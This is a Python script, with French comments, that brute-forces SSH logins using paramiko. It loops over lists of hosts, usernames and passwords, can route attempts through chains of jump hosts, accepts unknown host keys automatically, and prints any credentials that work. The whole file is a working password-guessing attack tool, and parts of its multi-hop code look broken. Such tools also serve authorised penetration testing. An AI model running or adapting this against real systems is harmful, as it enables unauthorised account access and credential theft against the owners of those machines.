import sys
import getopt
import paramiko

#File to dictionnary

def file_to_dict(my_file):
    output = []
    with open (my_file) as file:
        for line in file:
            output.append(line.replace("\n",""))
    return output

#initialise session with jumps

def init_jump(jump_list,hostname,port):
    current_channel = None

    if len(jump_list) == 0:
        return current_channel

    for index,i in enumerate(jump_list):

        if index == len(jump_list)-1: #done

            session = paramiko.SSHClient()
            #auto adding host key
            session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            #connect to jump machine
            session.connect(hostname=i[0],username=i[1],password=i[2],port=int(i[3]))
            #set transport var
            session_transport = session.get_transport()
            #set usefull addr
            session_addr = (i[0],int(i[3]))
            target_addr = (hostname,port)
            #set channel
            current_channel = session_transport.open_channel("direct-tcpip", session_addr, target_addr)

            return current_channel

        else: #done
            if index == 0: #done
                session = paramiko.SSHClient()
                #auto adding host key
                session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                #connect to jump machine
                session.connect(hostname=i[0],username=i[1],password=i[2],port=int(i[3]))
                #set transport var
                session_transport = session.get_transport()
                #set usefull addr
                session_addr = (i[0],int(i[3]))
                target_addr = (jump_list[index+1][0],int(jump_list[index+1][3]))
                #set channel
                current_channel = session_transport.open_channel("direct-tcpip", session_addr, target_addr)

            else: #done
                #oppening connexion on second rebond
                target = paramiko.SSHClient()
                target.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    target.connect(hostname=target_addr,username=i[1],password=i[2],port=int(i[3]),sock=current_channel)

                    #retrieve channel from new session
                    target_channel = target.get_transport().open_channel("direct-tcpip",target_addr,(jump_list[index+1][0],int(jump_list[index+1][3])))
                            
                    #update current channel
                    current_channel = target_channel  
                except:
                    print("fail to connect over rebond ["+ str(index) + "/" + str(len(jump_list)) + "]")

#essaie un pass sur un user

def sshbf_onepass_oneuser(my_hostname,my_username,my_password,my_port,jump_list):
    
    my_sock = None

    try:
        my_sock = init_jump(jump_list=jump_list,hostname=my_hostname,port=my_port)
    except:
        print("Fail to use rebond, let's try without rebond")

    with paramiko.SSHClient() as session:

        #auto adding host key
        session.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            session.connect(my_hostname,port=my_port,username=my_username,password=my_password,auth_timeout=2,sock=my_sock)
            return [my_username,my_password,my_hostname]
        except:
            return


#essai plusieur pass sur plusieur user

def sshbf_manypass_manyuser(my_hostname,username_list,password_list,my_port,jump_list):
    
    result = []

    if my_hostname == [] or username_list == [] or password_list ==[]:
        raise

    with paramiko.SSHClient() as session:
        for hostname in my_hostname:
            for user in username_list:
                for password in password_list:
                    result.append(sshbf_onepass_oneuser(my_hostname=hostname,my_username=user,my_password=password,my_port=my_port,jump_list=jump_list))

    for i in result:
        if i is not None:
            print("Credentials found: [username]: " + i[0] + " [password]: " + i[1] + "[host]: " + i[2])

def main():

    #option: -u (username)
    #option: -U (list of username)
    #option: -p (pasword)
    #option: -P (list of password)
    #option: -h (hostname)
    #option: -H (list of hostname)
    #option: -J add jump machine (host:user:pass:port,host:user:pass:port)

    #option: --port (choisir le port)

    #mes variables
    my_port=22
    my_host= []
    my_users = []
    my_pass = []
    my_jump = []

    #gestion des arguments
    try:
        opts, args = getopt.getopt(sys.argv[1:], "u:U:p:P:h:H:J:", ['port=',])
    except getopt.GetoptError as e:
        print(e)
        return

    for opt, arg in opts:

        if opt == ("-U"): #Done
            try:
                for i in file_to_dict(arg):
                    my_users.append(i)
            except:
                print("Fail to add password list")

        if opt == ("-u"): #Done
            my_users.append(arg)

        if opt == ("-P"): #Done
            try:
                for i in file_to_dict(arg):
                    my_pass.append(i)
            except:
                print("Fail to import password list")

        if opt == ("-p"): #Done
            my_pass.append(arg)

        if opt == ("--port"): #Done
            try:
                my_port = int(arg)
            except:
                print("port setting unsuccessful")

        if opt == ("-h"): #Done
            my_host.append(arg)

        if opt == ("-H"): #Done
            try:
                for i in file_to_dict(arg):
                    my_host.append(i)
            except:
                print("Fail to import hostname list")

        if opt == ("-J"):
            for i in arg.split(","):
                my_jump.append(i.split(":"))
                
    #tentative de connexion
    try:
        sshbf_manypass_manyuser(my_hostname=my_host,username_list=my_users,password_list=my_pass,my_port=my_port,jump_list=my_jump)
    except:
        print("Error: Something went wrong")
        
if __name__ == '__main__':
    main()

#to add
#threading

